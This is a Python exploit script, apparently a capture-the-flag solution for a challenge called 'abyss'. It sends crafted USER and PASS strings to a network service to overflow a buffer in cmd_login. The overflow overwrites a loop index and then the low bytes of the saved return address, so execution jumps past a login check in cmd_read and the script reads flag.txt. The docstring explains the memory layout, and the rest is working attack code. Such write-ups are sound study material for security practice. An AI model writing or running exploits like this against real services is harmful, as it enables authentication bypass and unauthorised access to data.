#!/usr/bin/env python3
"""abyss: cmd_login copies USER/PASS with no bounds check, so the PASS copy loop can
reach the saved return address of cmd_login. We cannot write NUL bytes except one
(the copy loop stops at NUL), so only the low 3 bytes of the return address are
written, and the NUL terminator writes byte 3.

Return target: 0x4014ed (the `jne` in cmd_read that skips the logged_in check).
ZF is still 0 from the failed strcmp in cmd_login, so the jne jumps to the read path.

The loop index i lives at rbp-4, inside the PASS buffer. Writing 0x1c to it (through the
USER bytes) makes i = 0x21d, so the next copied bytes land on the return address.
"""
import socket
import struct
import sys
import time

RET_TARGET = 0x4014ED
assert RET_TARGET.to_bytes(8, "little")[3] == 0  # byte 3 is written by the NUL terminator


def user_payload():
    # Layout of the USER string (32 bytes, then NUL):
    #   [0..16]  nonzero filler (copied into PASS source)
    #   [17]     0x1c, the value that moves i to 0x21d after the PASS copy reaches j=524
    #   [18..28] filler
    #   [29..31] return address bytes 0..2 (no zero bytes)
    body = b"A" * 17 + b"\x1c" + b"B" * 11
    body += RET_TARGET.to_bytes(8, "little")[:3]
    assert len(body) == 32 and all(body)
    return body + b"\x00"


def pass_payload():
    # 507 nonzero bytes fill buf[5..511]; the copy then continues into the USER region
    return b"C" * 507


def solve(host, port):
    with socket.create_connection((host, port), timeout=30) as s:
        def send(data):
            s.sendall(data)
            time.sleep(0.3)  # keep each read() on the server from seeing two messages

        send(struct.pack("<i", 0))  # LOGIN
        send(b"USER " + user_payload())
        send(b"PASS " + pass_payload())
        send(b"flag.txt\x00")  # path for READ (sent after the jump into cmd_read)
        out = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    print(out.decode(errors="replace"))


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <ip> <port>")
        sys.exit(1)
    solve(sys.argv[1], int(sys.argv[2]))
